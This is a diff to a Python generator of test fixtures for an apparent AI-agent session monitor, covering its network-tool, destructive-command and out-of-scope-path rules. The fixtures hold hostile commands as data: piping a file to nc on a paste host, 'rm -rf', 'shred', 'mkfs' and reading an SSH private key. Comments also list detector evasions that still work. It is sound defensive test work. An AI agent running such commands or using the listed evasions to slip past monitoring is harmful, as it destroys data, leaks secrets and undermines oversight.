@@ -2,7 +2,11 @@
 
 Run from the repository root: python3 tests/fixtures/rules/generate.py
 """
-import datetime, hashlib, json, os, sys
+import datetime, hashlib, importlib.util, json, os, sys
+# M4.2: Bash lines with command_programs are made by capture itself, from the command.
+_spec = importlib.util.spec_from_file_location("raqib_capture_for_fixtures", os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "raqib", "hooks", "capture.py"))
+CAPTURE = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(CAPTURE)
 T0 = datetime.datetime(2026, 10, 16, 13, 0, 0, tzinfo=datetime.timezone.utc)
 CWD = "/work/example"
 R = "tests/fixtures/rules/"
@@ -40,6 +44,9 @@ class S:
         return self.seq
     def bash(self, head, **kw):
         return self.call("Bash", {"command_head": head}, **kw)
+    def command(self, command, **kw):
+        """A Bash call as M4.2 capture records it: command_head and command_programs."""
+        return self.call("Bash", CAPTURE.input_meta("Bash", {"command": command}), **kw)
 
 def dump(lines):
     return ",\n".join("  " + json.dumps({k: r[k] for k in KEYS if k in r}, separators=(", ", ": ")) for r in lines)
@@ -61,13 +68,36 @@ def write(path, lines, context=None, expect=None):
 # NET-TOOL
 s = S("fixture-rules-net-1"); s.bash("ls"); n = s.bash("curl"); write(R + "NET-TOOL/positive-curl.json", s.lines, expect=[n])
 s = S("fixture-rules-net-2"); n = s.call("WebFetch", {"url_host": "paste.example.net"}); write(R + "NET-TOOL/positive-webfetch.json", s.lines, expect=[n])
-s = S("fixture-rules-net-3"); s.bash("git"); s.call("Read", {"path": CWD + "/curl.txt"}); s.bash("curlie-not-a-net-tool"); s.call("Edit", {"path": CWD + "/net.py"})
+# M4.2 REDO-2 (E-7): benign Bash lines are written by capture, so they carry command_programs.
+s = S("fixture-rules-net-3"); s.command("git log --oneline -3"); s.call("Read", {"path": CWD + "/curl.txt"}); s.command("curlie-not-a-net-tool --help"); s.call("Edit", {"path": CWD + "/net.py"})
 write(R + "NET-TOOL/negative-local.json", s.lines)
+# M4.2 E2: a network program anywhere in the command (command_programs).
+s = S("fixture-rules-net-4"); s.command("ls -la"); seqs = [s.command(c) for c in (
+    "cd build && curl -sI https://example.com", "cat notes.txt | nc paste.example.net 9999",
+    "bash -c 'wget -q https://example.com/x'", "echo $(curl -s https://example.com/ip)")]
+write(R + "NET-TOOL/positive-programs.json", s.lines, expect=seqs)
+# The evasions that stay (D-4: python -c code is an argument; wrappers; programs not on the list).
+s = S("fixture-rules-net-5")
+for c in ("python3 -c 'import urllib.request'", "git fetch origin", "sudo curl https://example.com",
+          "echo curl | cat", "pip install requests"):
+    s.command(c)
+write(R + "NET-TOOL/negative-programs.json", s.lines)
 # DESTRUCT-CMD
 s = S("fixture-rules-destruct-1"); s.bash("ls"); n = s.bash("rm"); write(R + "DESTRUCT-CMD/positive-rm.json", s.lines, expect=[n])
 s = S("fixture-rules-destruct-2"); n = s.bash("mkfs.ext4"); write(R + "DESTRUCT-CMD/positive-mkfs.json", s.lines, expect=[n])
-s = S("fixture-rules-destruct-3"); s.bash("rmate"); s.bash("ddgr"); s.call("Write", {"path": CWD + "/rm.sh"}); s.bash("git")
+s = S("fixture-rules-destruct-3"); s.command("rmate notes.txt"); s.command("ddgr python"); s.call("Write", {"path": CWD + "/rm.sh"}); s.command("git status")
 write(R + "DESTRUCT-CMD/negative-safe.json", s.lines)
+# M4.2 E2: a destructive program anywhere in the command (command_programs).
+s = S("fixture-rules-destruct-4"); s.command("ls -la"); seqs = [s.command(c) for c in (
+    "cd build && rm -rf out", "ls;shred -u old.key", "bash -c 'mkfs.ext4 /dev/sdz1'",
+    "git status | dd of=/dev/null")]
+write(R + "DESTRUCT-CMD/positive-programs.json", s.lines, expect=seqs)
+# The evasions that stay: python -c code, a wrapper, find -delete, git clean, rm as an argument.
+s = S("fixture-rules-destruct-5")
+for c in ("python3 -c 'import os; os.remove(\"x\")'", "sudo rm -rf build", "find . -name '*.pyc' -delete",
+          "git clean -fdx", "echo rm | cat", "rmate notes.txt; ddgr python"):
+    s.command(c)
+write(R + "DESTRUCT-CMD/negative-programs.json", s.lines)
 # SCOPE-PATH
 s = S("fixture-rules-scope-1"); n = s.call("Read", {"path": "~/.ssh/id_ed25519"}); write(R + "SCOPE-PATH/positive-ssh-key.json", s.lines, expect=[n])
 s = S("fixture-rules-scope-2"); a = s.call("Edit", {"path": "/etc/hosts"}); b = s.call("Write", {"path": "../other-project/notes.md"})
@@ -124,17 +154,17 @@ s = S("fixture-benign-dev"); s.event("session_start")
 for tool, meta in [("Glob", {"path": CWD}), ("Read", {"path": CWD + "/src/app.py"}), ("Grep", {"path": CWD + "/src"}),
                    ("Edit", {"path": CWD + "/src/app.py"}), ("Write", {"path": CWD + "/tests/test_app.py"})]:
     s.call(tool, meta)
-for head in ("python3", "git", "git", "ls", "pytest"):
-    s.bash(head)
+for command in ("python3 -m pip list", "git status", "git diff --stat", "ls -la", "pytest -q"):
+    s.command(command)
 s.event("stop")
 write(R + "benign/dev-session.json", s.lines)
 s = S("fixture-benign-docs"); s.event("session_start"); s.call("Read", {"path": CWD + "/pyproject.toml"})
 s.call("WebFetch", {"url_host": "docs.python.org"}); s.call("Edit", {"path": CWD + "/pyproject.toml"}); s.event("stop")
 write(R + "benign/docs-lookup.json", s.lines)
-s = S("fixture-benign-cleanup"); s.event("session_start"); s.bash("make"); s.bash("rm"); s.bash("make"); s.event("stop")
+s = S("fixture-benign-cleanup"); s.event("session_start"); s.command("make"); s.command("rm -rf build"); s.command("make test"); s.event("stop")
 write(R + "benign/build-cleanup.json", s.lines)
 s = S("fixture-benign-scoped"); s.event("session_start")
 for p in ["src/app.py", "tests/test_app.py", "src/util.py"]:
     s.call("Read", {"path": CWD + "/" + p}); s.call("Edit", {"path": CWD + "/" + p})
-s.bash("pytest"); s.bash("git"); s.event("stop")
+s.command("pytest -q tests"); s.command("git diff --stat"); s.event("stop")
 write(R + "benign/scoped-task-session.json", s.lines, {"scope": ["src", "tests"]})
